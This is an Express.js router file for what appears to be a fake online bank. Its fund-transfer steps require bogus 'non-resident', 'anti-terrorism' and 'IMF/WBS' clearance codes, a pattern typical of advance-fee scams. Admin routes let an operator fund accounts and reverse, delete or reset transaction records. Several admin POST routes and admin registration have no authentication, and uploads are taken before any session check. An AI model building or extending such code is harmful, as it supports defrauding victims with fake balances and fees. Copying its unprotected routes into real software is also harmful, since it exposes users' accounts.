const express = require("express")
const router = express.Router();
const API = require("../api/api")
const Uri = process.env.URI
const check_user_session = require("../middlewares/check_user_session");
const check_admin_session = require("../middlewares/check_admin_session.js");
const multer = require("multer");
const req = require("express/lib/request");
const sessionConfig = require("../middlewares/session");
const session = require("express-session");


router.use(session(sessionConfig));



//initialize multer
let storage = multer.diskStorage({
  destination: (req, file, cb) => {
     cb(null, './uploads')
  }, 
  filename: (req, file, cb) => {
     cb(null, file.fieldname + "_" + Date.now() + "." + file.originalname.split(".")[1]);
  }
})
 
let upload = multer({
  storage: storage
}) 




//GET REQUESTS FOR DASHBOARD

router.get("/account/dashboard", check_user_session, API.dashboard_pages)

router.get("/account/transactions", check_user_session, API.dashboard_pages)

router.get("/account/virtual_card", check_user_session, API.dashboard_pages)

router.get("/account/transfer_funds", check_user_session, API.dashboard_pages)

router.get("/account/loan_mortages", check_user_session, API.dashboard_pages)

router.get("/account/customer_support", check_user_session, API.dashboard_pages)

router.get("/account/transfer_funds/non_resident_code", check_user_session, API.dashboard_pages)

router.get("/account/transfer_funds/anti_terrorism_verification_code", check_user_session, API.dashboard_pages)

router.get("/account/transfer_funds/imf_wbs_confirmation_code", check_user_session, API.dashboard_pages)

router.get("/account/transfer_funds/review_transfer", check_user_session, API.dashboard_pages)

router.get("/account/transfer_funds/status", check_user_session, API.dashboard_pages)

router.get("/account/transfer_funds/reciept", check_user_session, API.dashboard_pages)

router.get("/account/profile", check_user_session, API.dashboard_pages)
 
router.get("/register", API.Oregister)

router.get("/email_verification/:id", API.email_verification)

router.get("/email-confirmation/:id", API.email_confirmation)

router.get("/login", API.Ologin)

router.get("/forgot_password", API.forgot_password)

router.get("/logout", API.logout)

router.get("/new_password/:id", API.new_password)


//POST REQUESTS

router.post("/register", upload.single("image"), API.register)

router.post("/login", API.login)

router.post("/request_reset_pass_link", API.request_reset_pass_link)

router.post("/update_profile", check_user_session, API.update_profile)

router.post("/check_non_resident_code", check_user_session, API.check_non_resident_code);

router.post("/check_anti_terrorism_verification_code", check_user_session, API.check_anti_terrorism_verification_code);

router.post("/check_imf_wbs_confirmation_code", check_user_session, API.check_imf_wbs_confirmation_code);

router.post("/check_four_digit_pin", check_user_session, API.check_four_digit_pin);

router.post("/update_photo", upload.single("file"), check_user_session, API.update_photo)

router.post("/send_complaint_mail", check_user_session, API.send_complaint_mail)

router.post("/create_new_password", API.create_new_password)

router.post("/transfer_money", check_user_session, API.transfer_money);

//ADMIN PAGES


//get requests
router.get("/admin_register", API.admin_register)

router.get("/admin_login", API.admin_login)

router.get("/account/admin_dashboard", check_admin_session, API.admin_dashboard)

router.get("/account/users", check_admin_session, API.users)

router.get("/account/user_transactions", check_admin_session, API.user_transactions)

router.get("/account/edit_user/:id", check_admin_session, API.edit_user)

router.get("/admin_logout", API.admin_logout)


//post requests
router.post("/admin_registration", API.admin_registration)

router.post("/admin_logging", API.admin_logging)

router.post('/reverse_transaction', API.reverse_transaction)

router.post("/update", API.update);

router.post("/fund_account", API.fund_account)

router.post("/reset_transaction_history", API.reset_transaction_history)

router.post("/delete_transaction", API.delete_transaction);

router.post("/delete_user", API.delete_user);

module.exports = router